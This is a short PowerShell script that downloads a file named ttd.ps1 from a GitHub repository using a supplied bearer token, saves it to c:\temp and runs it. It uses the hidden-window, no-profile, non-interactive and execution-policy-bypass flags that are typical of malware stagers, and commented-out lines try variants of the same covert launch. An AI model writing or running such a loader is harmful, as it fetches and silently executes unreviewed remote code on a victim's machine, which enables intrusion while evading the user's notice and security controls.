param ($token, $owner)
$uri = "https://api.github.com/repos/$owner/crl/contents/scripts/ttd.ps1"
$pl = iwr -Uri $uri -Headers @{"Authorization" = "Bearer $token";"Accept" = "application/vnd.github.v3.raw"} -OutFile "c:\temp\ttd.ps1"
#powershell.exe -w h -NoP -NonI -ep Bypass $pl
#powershell.exe -w h -NoP -NonI -ep Bypass "c:\temp\ttd.ps1"
powershell $pl
powershell -w h -NoP -NonI -ep Bypass "c:\temp\ttd.ps1"
